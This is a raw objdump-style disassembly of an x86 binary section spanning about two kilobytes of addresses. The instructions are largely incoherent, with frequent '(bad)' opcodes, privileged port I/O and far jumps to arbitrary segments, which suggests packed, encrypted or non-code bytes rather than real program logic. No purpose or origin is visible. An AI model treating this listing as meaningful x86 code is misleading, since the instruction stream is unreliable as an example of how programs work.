  406f9e:	pop    eax
  406f9f:	add    eax,0x128a4a3f
  406fa4:	outs   dx,DWORD PTR ds:[esi]
  406fa5:	int    0x46
  406fa7:	add    BYTE PTR [esi+0x4d],dh
  406faa:	imul   edx,DWORD PTR [ecx+0x25],0x93219366
  406fb1:	ins    DWORD PTR es:[edi],dx
  406fb2:	mov    WORD PTR [ecx-0xb2f8dd],ss
  406fb8:	sbb    DWORD PTR [edx],esp
  406fba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406fbb:	bound  ebx,QWORD PTR [ebx+0x3e]
  406fbe:	fld    TBYTE PTR [edi]
  406fc0:	hlt    
  406fc1:	or     BYTE PTR [edi+0x74],bl
  406fc4:	sbb    eax,0x81b00eb
  406fc9:	scas   eax,DWORD PTR es:[edi]
  406fca:	(bad)  
  406fcb:	ins    DWORD PTR es:[edi],dx
  406fcc:	sar    BYTE PTR [edi-0x78],0x5
  406fd0:	test   BYTE PTR [edx],0x71
  406fd3:	outs   dx,DWORD PTR ds:[esi]
  406fd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406fd5:	loop   0x406f9d
  406fd7:	das    
  406fd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406fd9:	retf   
  406fda:	loope  0x406fdc
  406fdc:	popf   
  406fdd:	add    ah,0x33
  406fe0:	(bad)  
  406fe1:	icebp  
  406fe2:	lahf   
  406fe3:	fwait
  406fe4:	(bad)  
  406fe5:	outs   dx,DWORD PTR ds:[esi]
  406fe6:	xor    eax,DWORD PTR [ebx+ecx*4]
  406fe9:	aaa    
  406fea:	ret    
  406feb:	es out 0x17,eax
  406fee:	xchg   DWORD PTR [edx+0x4f5176d5],eax
  406ff4:	(bad)
  406ff7:	mov    ebx,0x3994bdc
  406ffc:	into   
  406ffd:	add    DWORD PTR [ecx],edx
  406fff:	in     eax,0x3d
  407001:	test   BYTE PTR [esi],0x9a
  407004:	jge    0x40701c
  407006:	and    ebx,DWORD PTR [ebp*4-0x423079ee]
  40700d:	in     al,dx
  40700e:	dec    ecx
  40700f:	xchg   esi,eax
  407010:	mov    esi,0x2cb95780
  407015:	pop    ss
  407016:	jge    0x407021
  407018:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407019:	jg     0x406fa6
  40701b:	es inc esp
  40701d:	mov    esp,0x1d6bdd23
  407022:	jecxz  0x40700c
  407024:	arpl   WORD PTR [esi],sp
  407026:	out    dx,eax
  407027:	mov    dh,0xea
  407029:	daa    
  40702a:	pop    ebp
  40702b:	shl    DWORD PTR [ecx-0x20],1
  40702e:	pop    eax
  40702f:	inc    ebx
  407030:	dec    edi
  407031:	ret    0x7ffa
  407034:	and    BYTE PTR [eax],ah
  407036:	popf   
  407037:	mov    bh,0x7b
  407039:	add    eax,0xffd0d7ab
  40703e:	sbb    edx,edx
  407040:	dec    eax
  407041:	mov    edx,DWORD PTR [edi+0x636541d2]
  407047:	and    al,0x72
  407049:	sub    DWORD PTR [edx-0x4c],0xfffffff9
  40704d:	daa    
  40704e:	ds in  eax,dx
  407050:	scas   eax,DWORD PTR es:[edi]
  407051:	adc    eax,0x2d9fd5a
  407056:	push   ss
  407057:	test   BYTE PTR [edi+eiz*1-0x31],bh
  40705b:	sahf   
  40705c:	(bad)  
  40705e:	pop    esi
  40705f:	div    DWORD PTR [edi+0x49dc1487]
  407065:	or     eax,DWORD PTR [edx+0x70eed650]
  40706b:	sbb    al,0x8f
  40706d:	dec    esi
  40706e:	inc    edi
  40706f:	mov    edi,0xa4bad696
  407074:	ins    BYTE PTR es:[edi],dx
  407075:	pop    ebp
  407076:	push   cs
  407077:	add    edx,DWORD PTR [ebp+edi*1+0x6f5db982]
  40707e:	retf   
  40707f:	sbb    edx,eax
  407081:	fild   DWORD PTR [esi-0x45f3f63b]
  407087:	mov    edx,0x688a4b69
  40708c:	jae    0x40708a
  40708e:	fmul   DWORD PTR [ebx+0x2cde4bfc]
  407094:	lods   al,BYTE PTR ds:[esi]
  407095:	pushf  
  407096:	es mov ah,0xc
  407099:	leave  
  40709a:	inc    edi
  40709b:	mov    ?,WORD PTR [edi+0x6]
  40709e:	outs   dx,DWORD PTR ds:[esi]
  40709f:	into   
  4070a0:	push   esp
  4070a1:	and    eax,0x9974f5b3
  4070a6:	or     esp,ebp
  4070a8:	add    al,BYTE PTR [ebx+0x1d]
  4070ab:	and    ecx,DWORD PTR [edi+0x67b3150a]
  4070b1:	popf   
  4070b2:	push   cs
  4070b3:	(bad)  
  4070b4:	test   al,0xce
  4070b6:	sbb    al,0x28
  4070b8:	or     dl,BYTE PTR [ebp+0x2c46fc8]
  4070be:	cld    
  4070bf:	mov    esp,fs
  4070c1:	outs   dx,DWORD PTR ds:[esi]
  4070c2:	hlt    
  4070c3:	das    
  4070c4:	sahf   
  4070c5:	pop    eax
  4070c6:	push   ds
  4070c7:	jecxz  0x4070ac
  4070c9:	pop    ss
  4070ca:	add    al,0xc
  4070cc:	aad    0x4b
  4070ce:	xor    bl,BYTE PTR [esi-0x31]
  4070d1:	test   DWORD PTR [esi],esi
  4070d3:	cmp    ebp,ecx
  4070d5:	cmc    
  4070d6:	xor    DWORD PTR [eax+0x7c867366],ebx
  4070dc:	cmp    eax,0xff00e496
  4070e1:	sub    DWORD PTR [eax-0x3f],eax
  4070e4:	das    
  4070e5:	shr    DWORD PTR [ebx+0x4f],cl
  4070e8:	in     eax,0xfe
  4070ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070eb:	add    esp,DWORD PTR ds:0x63342d05
  4070f1:	in     al,0xf2
  4070f3:	dec    edx
  4070f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070f6:	lahf   
  4070f7:	pushf  
  4070f8:	je     0x4070f4
  4070fa:	mov    BYTE PTR [ebx-0x25],ch
  4070fd:	out    0xa2,eax
  4070ff:	ins    DWORD PTR es:[edi],dx
  407100:	pushf  
  407101:	adc    DWORD PTR [edx+0x3c],esp
  407104:	ficomp DWORD PTR [ebp-0x3dcf1206]
  40710a:	loopne 0x407141
  40710c:	ja     0x407177
  40710e:	ret    
  40710f:	xchg   ebx,eax
  407110:	xor    BYTE PTR [edi+0x28],bh
  407113:	icebp  
  407114:	push   es
  407115:	sahf   
  407116:	dec    eax
  407117:	inc    edi
  407118:	(bad)  
  407119:	push   esi
  40711a:	sub    BYTE PTR [ebx+0x75],dh
  40711d:	xchg   ebp,eax
  40711e:	fsub   st(5),st
  407120:	jmp    0x4070a7
  407122:	mov    cl,0x61
  407124:	test   eax,0xbc2b461a
  407129:	or     DWORD PTR [esp+eax*4],0x4ad10dab
  407130:	inc    edi
  407131:	cmp    edx,DWORD PTR [ebx-0x7130f81d]
  407137:	and    cl,BYTE PTR [edx]
  407139:	cdq    
  40713a:	dec    ecx
  40713b:	iret   
  40713c:	xor    eax,DWORD PTR [edx-0x51bd993]
  407142:	sbb    DWORD PTR ds:0xc9091e7f,esp
  407148:	loopne 0x407116
  40714a:	push   esi
  40714b:	mov    dh,0x97
  40714d:	add    ebp,edi
  40714f:	inc    edi
  407150:	add    edx,eax
  407152:	fdiv   DWORD PTR ds:0x6d3af89e
  407158:	iret   
  407159:	(bad)  
  40715a:	push   ecx
  40715b:	das    
  40715c:	punpckhbw mm2,mm2
  40715f:	lock or ch,bh
  407162:	ficom  WORD PTR ds:0x9457c061
  407168:	push   eax
  407169:	gs and ch,dh
  40716c:	pop    edx
  40716d:	js     0x407127
  40716f:	test   eax,0x511cc6a3
  407174:	mov    gs,WORD PTR [edi]
  407176:	add    bl,ah
  407178:	aad    0x49
  40717a:	shr    DWORD PTR [edi+esi*2+0x5],0x3f
  40717f:	pop    ebp
  407180:	xor    DWORD PTR [ecx+ebx*4],ebx
  407183:	xor    al,0x31
  407185:	in     al,dx
  407186:	rol    ch,cl
  407188:	xor    ebp,ecx
  40718a:	fisttp WORD PTR [esi-0x9d1cda1]
  407190:	scas   eax,DWORD PTR es:[edi]
  407191:	vmulpd xmm0,xmm1,xmm4
  407195:	mov    cl,0x76
  407197:	cdq    
  407198:	add    BYTE PTR [eax-0x1ffb8adf],dh
  40719e:	fwait
  40719f:	and    DWORD PTR [ecx+0x587de32e],ebp
  4071a5:	stos   BYTE PTR es:[edi],al
  4071a6:	stc    
  4071a7:	jnp    0x4071b2
  4071a9:	inc    eax
  4071aa:	fmul   QWORD PTR [esi]
  4071ac:	xchg   ecx,eax
  4071ad:	in     al,0xbc
  4071af:	xchg   esi,eax
  4071b0:	jmp    0x4071b6
  4071b2:	(bad)  
  4071b3:	pop    edx
  4071b4:	cmp    BYTE PTR ds:0xc9cd2bff,dl
  4071ba:	cmp    edi,DWORD PTR [edx+0x75b7b8df]
  4071c0:	cwde   
  4071c1:	in     eax,0x30
  4071c3:	and    ecx,DWORD PTR [ebx]
  4071c5:	adc    al,ah
  4071c7:	(bad)  
  4071c9:	jmp    0x278a:0xcde00a69
  4071d0:	call   0x7d27f3a7
  4071d5:	(bad)  
  4071d6:	fcom   QWORD PTR [edx+0x3a]
  4071d9:	xchg   ecx,eax
  4071da:	int3   
  4071db:	cmp    BYTE PTR [ecx+0x2a],dh
  4071de:	ja     0x4071fd
  4071e0:	pop    esp
  4071e1:	mov    edi,0xab8c601f
  4071e6:	push   esi
  4071e7:	dec    eax
  4071e8:	cmp    BYTE PTR [ebp+0x4674cea5],bh
  4071ee:	push   es
  4071ef:	sub    dl,dh
  4071f1:	clc    
  4071f2:	sahf   
  4071f3:	xchg   ecx,eax
  4071f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4071f5:	sbb    edi,DWORD PTR [edx+ebp*2-0xd]
  4071f9:	adc    bl,BYTE PTR [ecx-0x6e]
  4071fc:	cmp    DWORD PTR [edx],ecx
  4071fe:	repnz (bad) 
  407201:	mov    BYTE PTR [edx+ebx*2],ch
  407204:	xor    bl,bh
  407206:	jecxz  0x4071fd
  407208:	test   al,0x4c
  40720a:	jns    0x407279
  40720c:	and    eax,0x8dfa7989
  407211:	cmp    DWORD PTR [edx],0xbf884cb3
  407217:	xchg   ebx,eax
  407218:	ins    BYTE PTR es:[edi],dx
  407219:	mov    fs,WORD PTR [esi+0x4641ef4a]
  40721f:	pop    es
  407220:	mov    ecx,DWORD PTR [edi]
  407222:	ss sbb ebx,ecx
  407225:	int3   
  407226:	stc    
  407227:	ror    BYTE PTR [ecx],cl
  407229:	adc    al,0xb3
  40722b:	out    0x8e,al
  40722d:	xchg   edi,eax
  40722e:	pushf  
  40722f:	add    BYTE PTR [eax+0x32],bl
  407232:	and    BYTE PTR [esi-0x6caf6f8c],bl
  407238:	push   esi
  407239:	pop    ds
  40723a:	jo     0x407241
  40723c:	jo     0x407235
  40723e:	pop    ds
  40723f:	repz data16 shl BYTE PTR [edx+0x69],cl
  407244:	dec    eax
  407245:	lods   al,BYTE PTR ds:[esi]
  407246:	in     al,0x21
  407248:	jl     0x40720e
  40724a:	adc    DWORD PTR [ecx],ebx
  40724c:	popf   
  40724d:	ret    
  40724e:	das    
  40724f:	mov    WORD PTR [ebx+0x189ae595],gs
  407255:	ret    
  407256:	(bad)  
  407257:	in     eax,dx
  407258:	xor    al,BYTE PTR [ebx+0x6f]
  40725b:	ins    DWORD PTR es:[edi],dx
  40725c:	add    DWORD PTR [ecx],edi
  40725e:	fimul  WORD PTR [esi+0x735beee9]
  407264:	nop
  407265:	adc    DWORD PTR [eax+0x22],eax
  407268:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40726a:	sbb    eax,0xe850bde2
  40726f:	test   edx,ebx
  407271:	cli    
  407272:	cmp    BYTE PTR [edi+esi*8],0x88
  407276:	imul   esi,DWORD PTR es:[ebp-0x14],0x4
  40727b:	sub    eax,0x97e563a
  407280:	sbb    ch,bl
  407282:	sbb    DWORD PTR [ebx+edx*4],esp
  407285:	adc    al,0x61
  407287:	or     BYTE PTR [edi-0x193614a1],ch
  40728d:	iretw  
  40728f:	jne    0x40721e
  407291:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407292:	xor    BYTE PTR [edi-0x136b19c4],0x7c
  407299:	and    ch,ah
  40729b:	jp     0x407286
  40729d:	div    DWORD PTR [esi-0x199b8bf5]
  4072a3:	es je  0x4072ae
  4072a6:	sbb    dh,bl
  4072a8:	xchg   DWORD PTR [edi],ebp
  4072aa:	shr    BYTE PTR [ebx],cl
  4072ac:	sbb    bh,BYTE PTR [ebx+0x69]
  4072af:	xchg   ebp,eax
  4072b0:	xlat   BYTE PTR ds:[ebx]
  4072b1:	mov    ah,0x41
  4072b3:	adc    eax,0xe6f7b069
  4072b8:	stos   BYTE PTR es:[edi],al
  4072b9:	adc    BYTE PTR [esi],ah
  4072bb:	xchg   esp,eax
  4072bc:	out    0xb2,eax
  4072be:	cmc    
  4072bf:	push   ebx
  4072c0:	ficom  DWORD PTR [edx]
  4072c2:	xor    cl,ch
  4072c4:	sbb    al,0x14
  4072c6:	daa    
  4072c7:	sub    al,0x9b
  4072c9:	cmp    BYTE PTR [ebp+ecx*4+0x3f],0x60
  4072ce:	sbb    ecx,ecx
  4072d0:	out    dx,al
  4072d1:	mov    WORD PTR [edx],?
  4072d3:	push   ss
  4072d4:	jae    0x4072b1
  4072d6:	imul   ecx,DWORD PTR [ebx-0x4ab9eb5b],0xffffff9c
  4072dd:	xor    ebp,DWORD PTR ds:0x172390e9
  4072e3:	retf   
  4072e4:	(bad)  
  4072e5:	jg     0x407327
  4072e7:	sbb    esi,ebp
  4072e9:	xor    eax,0x15
  4072ec:	int3   
  4072ed:	adc    eax,DWORD PTR [ecx]
  4072ef:	(bad)  
  4072f0:	call   0xf70384e0
  4072f5:	sbb    BYTE PTR [eax+0x14],bh
  4072f8:	stc    
  4072f9:	or     BYTE PTR [edx],bh
  4072fb:	inc    edx
  4072fc:	int    0x49
  4072fe:	imul   esi,DWORD PTR [eax+0x2d],0x3d17e15e
  407305:	fild   QWORD PTR [eax]
  407307:	test   cl,0x5
  40730a:	xchg   esp,eax
  40730b:	rol    bh,cl
  40730d:	sbb    eax,0x7335063e
  407312:	and    esi,edx
  407314:	(bad)  
  407315:	jp     0x40733e
  407317:	dec    edx
  407318:	icebp  
  407319:	mov    dh,0xd7
  40731b:	sub    ebx,edi
  40731d:	repnz and dl,BYTE PTR [ecx+eax*4]
  407321:	or     dl,BYTE PTR ds:0xb17a8f37
  407327:	jne    0x40737b
  407329:	sub    al,0x5d
  40732b:	les    esi,FWORD PTR [edx+0x18b4f54]
  407331:	into   
  407332:	ret    
  407333:	sub    BYTE PTR [ecx+0x3b8c084],0x79
  40733a:	lods   eax,DWORD PTR ds:[esi]
  40733b:	stc    
  40733c:	xor    ebx,DWORD PTR [eax-0x7b056284]
  407342:	mov    edx,ebx
  407344:	mov    al,0xea
  407346:	and    al,0x7f
  407348:	scas   eax,DWORD PTR es:[edi]
  407349:	retf   0xa61c
  40734c:	fsub   DWORD PTR [ebx+0x4c]
  40734f:	mov    eax,ds:0xc18227b6
  407354:	(bad)  
  407355:	jl     0x407385
  407357:	add    BYTE PTR [ebx+0x77c53d55],bh
  40735d:	xchg   esi,eax
  40735e:	dec    ebx
  40735f:	ret    0x1fae
  407362:	sbb    esp,DWORD PTR [ecx+0x5a]
  407365:	adc    al,0xac
  407367:	xor    ebx,ecx
  407369:	sbb    ebx,edi
  40736b:	ja     0x4073c1
  40736d:	pop    esp
  40736e:	fdivr  QWORD PTR [esi]
  407370:	mov    ch,0x0
  407372:	int3   
  407373:	dec    BYTE PTR [ebx-0x7316fa04]
  407379:	mov    ds:0xd0f4789,eax
  40737e:	mov    ecx,0x4a613159
  407383:	jl     0x4073ae
  407385:	(bad)  
  407387:	inc    esi
  407388:	cmp    eax,0xeca55d05
  40738d:	sub    eax,0x1da5a78f
  407392:	sbb    eax,0xd7ff3f57
  407397:	dec    ebx
  407398:	push   cs
  407399:	xlat   BYTE PTR ds:[ebx]
  40739a:	ins    DWORD PTR es:[edi],dx
  40739b:	mov    BYTE PTR [edi],bh
  40739d:	imul   edx
  40739f:	push   edx
  4073a0:	test   al,0x1c
  4073a2:	xor    BYTE PTR [eax],bl
  4073a4:	sbb    al,0x76
  4073a6:	mov    ecx,0xe34aade9
  4073ab:	cmp    DWORD PTR [ebx+0x4f],0x6ec550ab
  4073b2:	push   ecx
  4073b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073b4:	in     al,0x4f
  4073b6:	ss js  0x407409
  4073b9:	sahf   
  4073ba:	or     dh,al
  4073bc:	cmp    BYTE PTR [ecx],bl
  4073be:	aad    0x5c
  4073c0:	jge    0x407404
  4073c2:	rcl    DWORD PTR [esi-0x214b32fe],cl
  4073c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073c9:	push   cs
  4073ca:	fmul   st,st(1)
  4073cc:	js     0x407389
  4073ce:	scas   eax,DWORD PTR es:[edi]
  4073cf:	dec    edx
  4073d0:	cmp    ah,BYTE PTR [ebp+0x19]
  4073d3:	addr16 mov ah,0x3d
  4073d6:	mov    ch,0x1c
  4073d8:	cmc    
  4073d9:	cmc    
  4073da:	mov    ah,0xd6
  4073dc:	jmp    0x4073ae
  4073de:	dec    edi
  4073df:	mov    edi,0x268078a9
  4073e4:	adc    ebx,DWORD PTR [esp+ebp*8+0x7d]
  4073e8:	add    edi,DWORD PTR [ebp-0x34]
  4073eb:	sub    eax,0xe62940b3
  4073f0:	adc    al,0x45
  4073f2:	retf   
  4073f3:	stc    
  4073f4:	fs pop ds
  4073f6:	jmp    0xa605:0x49a60498
  4073fd:	mov    ch,0xf6
  4073ff:	rep outs dx,DWORD PTR ds:[esi]
  407401:	repnz fbstp TBYTE PTR [ebp+ebp*1-0x54]
  407406:	dec    esi
  407407:	outs   dx,DWORD PTR ds:[esi]
  407408:	sbb    BYTE PTR [edi+0x78],bl
  40740b:	stc    
  40740c:	retf   0x5272
  40740f:	jmp    0x66fd:0x716c019b
  407416:	and    BYTE PTR ds:0x5f296ff6,cl
  40741c:	rol    BYTE PTR [esi+0x45],1
  40741f:	call   0x466d:0x429d73d0
  407426:	pop    es
  407427:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407428:	adc    BYTE PTR [eax+0x64],bl
  40742b:	adc    eax,0xad1b6829
  407430:	cmp    eax,edx
  407432:	leave  
  407433:	fldenv [eax-0x1dc55653]
  407439:	inc    eax
  40743a:	retf   
  40743b:	outs   dx,BYTE PTR ds:[esi]
  40743c:	xor    DWORD PTR [edi+eax*2+0x12],0x7ce9f71c
  407444:	push   edx
  407445:	sub    DWORD PTR [ecx],ebp
  407447:	pop    ss
  407448:	popa   
  407449:	mov    WORD PTR [edi],fs
  40744b:	sbb    ecx,0x95cf3ff6
  407451:	or     al,0xb8
  407453:	(bad)  
  407454:	and    al,ch
  407456:	es inc eax
  407458:	push   ds
  407459:	mov    edx,0x1a5c35eb
  40745e:	jns    0x4073f9
  407460:	out    0x32,al
  407462:	shl    DWORD PTR [edi],cl
  407464:	mov    ecx,0xdea30974
  407469:	xor    al,0x4e
  40746b:	outs   dx,DWORD PTR ds:[esi]
  40746c:	xchg   edx,eax
  40746d:	into   
  40746e:	sub    edi,DWORD PTR [eax-0x5e]
  407471:	mov    dh,0xca
  407473:	mov    eax,0xe9e30fec
  407478:	loop   0x407428
  40747a:	shr    DWORD PTR [eax],1
  40747c:	sub    BYTE PTR [esi],dh
  40747e:	repnz pop esp
  407480:	mov    bh,0x6a
  407482:	div    DWORD PTR [edi-0x6eeef195]
  407488:	pop    ebx
  407489:	jl     0x407474
  40748b:	lods   eax,DWORD PTR ds:[esi]
  40748c:	outs   dx,DWORD PTR ds:[esi]
  40748d:	adc    bl,ch
  40748f:	mov    dh,0xa9
  407491:	push   ecx
  407492:	cmp    eax,0x921f93e6
  407497:	out    dx,eax
  407498:	outs   dx,BYTE PTR ds:[esi]
  407499:	push   ss
  40749a:	xchg   esp,eax
  40749b:	dec    eax
  40749c:	jge    0x407494
  40749e:	into   
  40749f:	dec    esi
  4074a0:	call   0x82228891
  4074a5:	push   edi
  4074a6:	or     al,0xe4
  4074a8:	lods   eax,DWORD PTR ds:[esi]
  4074a9:	mov    al,0xaf
  4074ab:	or     eax,0xd36ff823
  4074b0:	scas   eax,DWORD PTR es:[edi]
  4074b1:	gs jns 0x407475
  4074b4:	imul   eax,DWORD PTR [eax-0x550005ae],0x499eb301
  4074be:	push   ds
  4074bf:	adc    DWORD PTR [ebp+0x4e],0xffffffd5
  4074c3:	jmp    0x4074d7
  4074c5:	xlat   BYTE PTR ds:[ebx]
  4074c6:	ret    0x1fce
  4074c9:	inc    BYTE PTR [ecx+0x62afb31]
  4074cf:	test   DWORD PTR [ebp+0x54afc649],ebx
  4074d5:	jg     0x4074bb
  4074d7:	stos   BYTE PTR es:[edi],al
  4074d8:	lahf   
  4074d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074da:	sub    BYTE PTR [esi-0x1b06e37d],dh
  4074e0:	add    cl,cl
  4074e2:	lahf   
  4074e3:	aas    
  4074e4:	cmp    BYTE PTR [esi-0x6a942b82],cl
  4074ea:	lea    ebp,ds:0xd23fb80d
  4074f0:	fst    QWORD PTR [ebx]
  4074f2:	mov    edi,0xb67511ca
  4074f7:	xchg   ebx,eax
  4074f8:	xor    DWORD PTR [edi+0x16e81c23],edx
  4074fe:	mov    ebp,0x8c629431
  407503:	(bad)  
  407504:	aam    0xfe
  407506:	fcomi  st,st(1)
  407508:	sbb    eax,0x6e3adedb
  40750d:	pop    edx
  40750e:	inc    ecx
  40750f:	mov    al,0x30
  407511:	and    al,0x18
  407513:	outs   dx,DWORD PTR ds:[esi]
  407514:	daa    
  407515:	cld    
  407516:	je     0x4074d0
  407518:	push   esi
  407519:	pop    ebp
  40751a:	jmp    0x312c7a92
  40751f:	fadd   QWORD PTR [eax+0x7d8b7c5]
  407525:	pinsrw mm1,esi,0xa
  407529:	inc    esp
  40752a:	repz xchg ebp,eax
  40752c:	lods   al,BYTE PTR ds:[esi]
  40752d:	mov    eax,ds:0x504e24db
  407532:	jmp    0xa6ce1e3d
  407537:	xchg   esp,eax
  407538:	das    
  407539:	ret    0x502b
  40753c:	iret   
  40753d:	ins    BYTE PTR es:[edi],dx
  40753e:	in     al,0x23
  407540:	mov    bl,0x4c
  407542:	and    dx,0x4c33
  407547:	or     bl,bh
  407549:	in     eax,dx
  40754a:	xchg   esp,eax
  40754b:	inc    ebx
  40754c:	push   eax
  40754d:	(bad)  
  40754f:	or     DWORD PTR [ecx],eax
  407551:	sbb    al,0xf9
  407553:	call   0x22308607
  407558:	xor    BYTE PTR [eax-0x73],ch
  40755b:	mov    esi,0xb623b135
  407560:	mov    ebx,0xccb636f8
  407565:	and    eax,0xd3ef4815
  40756a:	and    BYTE PTR [eax],0xad
  40756d:	test   eax,0xbf096f33
  407572:	lods   eax,DWORD PTR ds:[esi]
  407573:	(bad)  
  407574:	std    
  407575:	add    ah,dh
  407577:	(bad)  
  407578:	sub    eax,0x9b299f4c
  40757d:	in     eax,0xd5
  40757f:	ret    
  407580:	jns    0x40750e
  407582:	xor    eax,0x65f2c0d7
  407587:	sbb    esi,DWORD PTR [ebx]
  407589:	std    
  40758a:	pop    ecx
  40758b:	adc    bl,bl
  40758d:	in     al,0xbd
  40758f:	mov    ah,0x1b
  407591:	arpl   WORD PTR [esi-0x7ae93822],bp
  407597:	mov    dh,dl
  407599:	(bad)  
  40759a:	jne    0x40752f
  40759c:	mov    ebp,0xb712c6a0
  4075a1:	fwait
  4075a2:	inc    esp
  4075a3:	push   eax
  4075a4:	shr    al,1
  4075a6:	fld    TBYTE PTR [edi-0x17312d8a]
  4075ac:	repnz in eax,dx
  4075ae:	xchg   ebp,eax
  4075af:	sbb    al,0x16
  4075b1:	lahf   
  4075b2:	jns    0x4075df
  4075b4:	add    ch,BYTE PTR [ecx-0x13b516f9]
  4075ba:	repz bound esi,QWORD PTR [eax-0x73b42e66]
  4075c1:	xor    dl,cl
  4075c3:	jmp    0x39fc:0x38107d46
  4075ca:	(bad)
  4075cd:	pop    ds
  4075ce:	icebp  
  4075cf:	cwde   
  4075d0:	or     al,dh
  4075d2:	xor    bl,bl
  4075d4:	mov    DWORD PTR [esi-0x411aa002],esp
  4075da:	sbb    eax,0xd044e942
  4075df:	loop   0x4075bb
  4075e1:	sahf   
  4075e2:	and    eax,0x3dcc612b
  4075e7:	ds mov edx,0x9b44adb4
  4075ed:	mov    esi,0x3a559ee3
  4075f2:	(bad)  
  4075f4:	sbb    eax,0x3c569232
  4075f9:	dec    esp
  4075fa:	mov    dh,BYTE PTR ds:0x97b5182e
  407600:	repz fnstenv [esi+esi*2]
  407604:	cmp    ah,BYTE PTR [ecx-0x7ef2d64e]
  40760a:	cdq    
  40760b:	mov    ds:0x58755b46,al
  407610:	jne    0x40763a
  407612:	xchg   ebx,eax
  407613:	repnz repnz or cl,BYTE PTR [eax-0x7d]
  407618:	jecxz  0x4075b0
  40761a:	cmc    
  40761b:	push   eax
  40761c:	stos   DWORD PTR es:[edi],eax
  40761d:	in     al,0x40
  40761f:	mov    esi,0xa425cbf3
  407624:	mov    WORD PTR [ebx],ss
  407626:	pop    edi
  407627:	dec    ebp
  407628:	int3   
  407629:	repz loop 0x40761a
  40762c:	adc    ebx,DWORD PTR [ebx+0x62]
  40762f:	scas   al,BYTE PTR es:[edi]
  407630:	scas   eax,DWORD PTR es:[edi]
  407631:	and    ah,ch
  407633:	repnz imul esi,ebx,0xffffffc8
  407637:	xchg   esi,eax
  407638:	xor    al,0x9e
  40763a:	cs in  al,dx
  40763c:	push   ss
  40763d:	outs   dx,DWORD PTR ds:[esi]
  40763e:	mov    al,0x21
  407640:	mov    esp,0xfa371ba9
  407645:	inc    ebp
  407646:	mov    ss,WORD PTR [edx+edx*8]
  407649:	mov    ebx,edx
  40764b:	into   
  40764c:	dec    ebp
  40764d:	lahf   
  40764e:	mov    ebx,0x5c98ce97
  407653:	js     0x407625
  407655:	mov    bl,0xe
  407657:	cmc    
  407658:	cdq    
  407659:	ja     0x40765c
  40765b:	xchg   ecx,eax
  40765c:	add    DWORD PTR [esi],eax
  40765e:	sub    esp,DWORD PTR [edx-0x7c]
  407661:	xor    esi,DWORD PTR [ebx+0x5de4bb96]
  407667:	(bad)  
  407668:	in     al,0x2e
  40766a:	mov    esp,0xb58a2409
  40766f:	add    DWORD PTR [edi+0x288d3588],eax
  407675:	mov    edi,0x54de73b5
  40767a:	rcl    BYTE PTR [edx],cl
  40767c:	das    
  40767d:	mov    bh,0x13
  40767f:	push   0x905146cf
  407684:	mov    dh,0x98
  407686:	addr16 das 
  407688:	mov    ecx,0xc82a76b3
  40768d:	cmp    ebp,DWORD PTR [edi+0x3b]
  407690:	les    edx,FWORD PTR [esi+ebx*8+0x0]
  407694:	in     al,dx
  407695:	inc    esi
  407696:	adc    bl,bh
  407698:	call   0x9aef:0xb2944d72
  40769f:	jnp    0x40768d
  4076a1:	push   esi
  4076a2:	sub    BYTE PTR [ecx],0xe6
  4076a5:	outs   dx,BYTE PTR ds:[esi]
  4076a6:	cmp    al,BYTE PTR [ecx]
  4076a8:	leave  
  4076a9:	pop    ecx
  4076aa:	inc    ebx
  4076ab:	ja     0x407729
  4076ad:	jno    0x407721
  4076af:	lods   eax,DWORD PTR ds:[esi]
  4076b0:	pop    esi
  4076b1:	dec    edi
  4076b2:	push   edi
  4076b3:	sbb    DWORD PTR ds:0xff57f71b,edi
  4076b9:	mov    eax,ds:0x102b93c2
  4076be:	pop    ss
  4076bf:	inc    ebx
  4076c0:	cld    
  4076c1:	(bad)  ss:[ebp+0x65f6aa31]
  4076c8:	js     0x40766f
  4076ca:	and    esp,ebp
  4076cc:	pop    ds
  4076cd:	cmp    dh,BYTE PTR [esi+eax*4-0x39]
  4076d1:	cmp    eax,eax
  4076d3:	jne    0x4076e5
  4076d5:	data16 adc al,0xbf
  4076d8:	adc    eax,0xe7e2b9e2
  4076dd:	push   ds
  4076de:	loop   0x4076bd
  4076e0:	adc    edi,DWORD PTR [eax-0x15d50e7c]
  4076e6:	stos   BYTE PTR es:[edi],al
  4076e7:	jno    0x40775e
  4076e9:	into   
  4076ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076eb:	add    ch,BYTE PTR [ebp+ecx*1-0x1abaecbf]
  4076f2:	icebp  
  4076f3:	fdivr  QWORD PTR [edx]
  4076f5:	add    al,0x6f
  4076f7:	sub    BYTE PTR [ebx-0x2beb6f47],bh
  4076fd:	arpl   WORD PTR [ecx-0x2a],cx
  407700:	not    DWORD PTR [ebx+0x28]
  407703:	mov    bl,0x3f
  407705:	push   ds
  407706:	fidiv  WORD PTR [esi+0x2c2259c4]
  40770c:	in     eax,dx
  40770d:	gs sar dh,1
  407710:	imul   BYTE PTR [ebx+0x6]
  407713:	rcr    BYTE PTR [edi],cl
  407715:	sub    al,0x80
  407717:	enter  0x6093,0xc3
  40771b:	call   0x86a64933
  407720:	std    
  407721:	mov    ?,WORD PTR [ecx]
  407723:	sbb    al,0x5
  407725:	daa    
  407726:	lods   eax,DWORD PTR ds:[esi]
  407727:	or     al,0xb7
  407729:	aaa    
  40772a:	jmp    0x5441d169
  40772f:	aam    0xa2
  407731:	inc    edi
  407732:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407733:	sub    edx,DWORD PTR [esi+0x5ef7cc25]
  407739:	inc    ecx
  40773a:	sti    
  40773b:	push   edx
  40773c:	in     eax,0x83
  40773e:	ss inc eax
  407740:	imul   esi,DWORD PTR [edi],0xffffffd6
  407743:	push   edx
